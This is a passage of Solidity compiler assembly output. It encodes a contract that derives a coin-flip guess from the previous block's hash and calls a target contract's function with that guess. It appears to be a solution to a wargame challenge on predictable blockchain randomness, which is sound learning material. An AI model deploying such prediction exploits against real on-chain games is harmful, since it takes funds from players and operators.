									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 830,
									"end": 1443,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 830,
									"end": 1443,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 830,
									"end": 1443,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 830,
									"end": 1443,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 830,
									"end": 1443,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 830,
									"end": 1443,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212205eb699bca14c130a68669dc753d1d2205415858a009b8a27ce366bc7b8564a1f64736f6c63430008000033",
									".code": [
										{
											"begin": 830,
											"end": 1443,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "PUSH",
											"source": 0,
											"value": "CDE4EFA9"
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 830,
											"end": 1443,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 1102,
											"end": 1440,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 1102,
											"end": 1440,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1102,
											"end": 1440,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 1102,
											"end": 1440,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 1102,
											"end": 1440,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1102,
											"end": 1440,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 1102,
											"end": 1440,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1102,
											"end": 1440,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 1102,
											"end": 1440,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 1102,
											"end": 1440,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1136,
											"end": 1154,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1190,
											"end": 1191,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 1175,
											"end": 1187,
											"name": "NUMBER",
											"source": 0
										},
										{
											"begin": 1175,
											"end": 1191,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 1175,
											"end": 1191,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1175,
											"end": 1191,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1175,
											"end": 1191,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 1175,
											"end": 1191,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1175,
											"end": 1191,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 1175,
											"end": 1191,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1165,
											"end": 1192,
											"name": "BLOCKHASH",
											"source": 0
										},
										{
											"begin": 1157,
											"end": 1193,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1157,
											"end": 1193,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 1136,
											"end": 1193,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1136,
											"end": 1193,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1221,
											"end": 1231,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1209,
											"end": 1217,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 1209,
											"end": 1217,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 1209,
											"end": 1231,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1267,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1267,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 1206,
											"end": 1267,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1247,
											"end": 1255,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1247,
											"end": 1255,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1247,
											"end": 1255,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1267,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 1206,
											"end": 1267,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1290,
											"end": 1300,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1279,
											"end": 1287,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 1279,
											"end": 1300,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1279,
											"end": 1300,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1279,
											"end": 1300,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 1279,
											"end": 1300,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1311,
											"end": 1327,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1343,
											"end": 1349,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 1343,
											"end": 1349,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 1330,
											"end": 1340,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1330,
											"end": 1349,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 1330,
											"end": 1349,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1330,
											"end": 1349,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1330,
											"end": 1349,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 1330,
											"end": 1349,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1330,
											"end": 1349,
											"name": "tag",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 1330,
											"end": 1349,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1311,
											"end": 1349,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1311,
											"end": 1349,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1360,
											"end": 1369,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1384,
											"end": 1385,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 1372,
											"end": 1380,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1372,
											"end": 1385,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 1372,
											"end": 1400,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 1372,
											"end": 1400,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1395,
											"end": 1400,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1372,
											"end": 1400,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 1372,
											"end": 1400,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 1372,
											"end": 1400,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 1372,
											"end": 1400,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1388,
											"end": 1392,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 1372,
											"end": 1400,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 1372,
											"end": 1400,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1360,
											"end": 1400,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1360,
											"end": 1400,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1421,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1413,
											"end": 1421,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1421,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1421,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1421,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 1413,
											"end": 1421,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1421,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1421,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1421,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1413,
											"end": 1421,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1426,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1413,
											"end": 1426,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1426,
											"name": "PUSH",
											"source": 0,
											"value": "1D263F67"
										},
										{
											"begin": 1427,
											"end": 1431,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "tag",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "EXTCODESIZE",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "tag",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "tag",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1413,
											"end": 1432,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1102,
											"end": 1440,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1102,
											"end": 1440,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1102,
											"end": 1440,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1102,
											"end": 1440,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 7,
											"end": 144,
											"name": "tag",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 7,
											"end": 144,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 7,
											"end": 144,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 92,
											"end": 98,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 86,
											"end": 99,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 77,
											"end": 99,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 77,
											"end": 99,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 108,
											"end": 138,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 132,
											"end": 137,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 108,
											"end": 138,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 108,
											"end": 138,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 108,
											"end": 138,
											"name": "tag",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 108,
											"end": 138,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 67,
											"end": 144,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 67,
											"end": 144,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 67,
											"end": 144,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 67,
											"end": 144,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 67,
											"end": 144,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 150,
											"end": 428,
											"name": "tag",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 150,
											"end": 428,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 150,
											"end": 428,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 266,
											"end": 268,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 254,
											"end": 263,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 245,
											"end": 252,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 241,
											"end": 264,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 237,
											"end": 269,
											"name": "SLT",
											"source": 1
										},
										{
											"begin": 234,
											"end": 236,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 234,
											"end": 236,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "27"
										},
										{
											"begin": 234,
											"end": 236,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 282,
											"end": 283,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 279,
											"end": 280,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 272,
											"end": 284,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 234,
											"end": 236,
											"name": "tag",
											"source": 1,
											"value": "27"
										},
										{
											"begin": 234,
											"end": 236,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 325,
											"end": 326,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 350,
											"end": 411,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 403,
											"end": 410,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 394,
											"end": 400,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 383,
											"end": 392,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 379,
											"end": 401,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 350,
											"end": 411,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 350,
											"end": 411,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 350,
											"end": 411,
											"name": "tag",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 350,
											"end": 411,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 340,
											"end": 411,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 340,
											"end": 411,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 296,
											"end": 421,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 224,
											"end": 428,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 224,
											"end": 428,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 224,
											"end": 428,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 224,
											"end": 428,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 224,
											"end": 428,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 434,
											"end": 543,
											"name": "tag",
											"source": 1,
											"value": "29"
										},
										{
											"begin": 434,
											"end": 543,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 515,
											"end": 536,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 530,
											"end": 535,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 515,
											"end": 536,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 515,
											"end": 536,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 515,
											"end": 536,
											"name": "tag",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 515,
											"end": 536,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 510,
											"end": 513,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 503,
											"end": 537,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 493,
											"end": 543,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 493,
											"end": 543,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 493,
											"end": 543,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 549,
											"end": 759,
											"name": "tag",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 549,
											"end": 759,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 549,
											"end": 759,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 674,
											"end": 676,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 663,
											"end": 672,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 659,
											"end": 677,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 651,
											"end": 677,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 651,
											"end": 677,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 687,
											"end": 752,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 749,
											"end": 750,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 738,
											"end": 747,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 734,
											"end": 751,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 725,
											"end": 731,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 687,
											"end": 752,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "29"
										},
										{
											"begin": 687,
											"end": 752,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 687,
											"end": 752,
											"name": "tag",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 687,
											"end": 752,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 641,
											"end": 759,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 641,
											"end": 759,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 641,
											"end": 759,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 641,
											"end": 759,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 641,
											"end": 759,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 765,
											"end": 950,
											"name": "tag",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 765,
											"end": 950,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 765,
											"end": 950,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 822,
											"end": 842,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 840,
											"end": 841,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 822,
											"end": 842,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 822,
											"end": 842,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 822,
											"end": 842,
											"name": "tag",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 822,
											"end": 842,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 817,
											"end": 842,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 817,
											"end": 842,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 856,
											"end": 876,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 874,
											"end": 875,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 856,
											"end": 876,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 856,
											"end": 876,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 856,
											"end": 876,
											"name": "tag",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 856,
